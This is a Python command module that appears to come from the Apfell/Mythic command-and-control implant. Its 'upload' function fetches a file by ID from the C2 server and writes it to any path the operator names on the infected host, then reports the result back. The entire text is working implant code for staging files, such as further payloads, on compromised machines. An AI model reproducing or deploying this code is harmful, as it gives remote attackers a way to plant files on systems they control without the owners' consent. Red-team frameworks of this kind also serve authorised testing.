def upload(apfell, c2, params="", task_id=""):
    import json
    import os
    # params="{"file_id": 5, "remote_path": "/path"}"
    try:
        param_json = json.loads(params)
    except Exception as e:
        output = json.dumps({"user_output": "Failed to parse params: {}".format(params), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
        return
    try:
        file_data = c2.upload(param_json['file_id'])
    except Exception as e:
        output = json.dumps({"user_output": "Failed to upload file: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
        return
    try:
        file = open(param_json['remote_path'], 'wb')
        file.write(file_data)
        file.close()
        output = json.dumps({"user_output": "Wrote file", "completed": True})
        c2.post_response(response=output, task_id=task_id)
    except Exception as e:
        output = json.dumps({"user_output": "Failed to write file: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
    apfell.remove_job(task_id)
    return
COMMAND_ENDS_HERE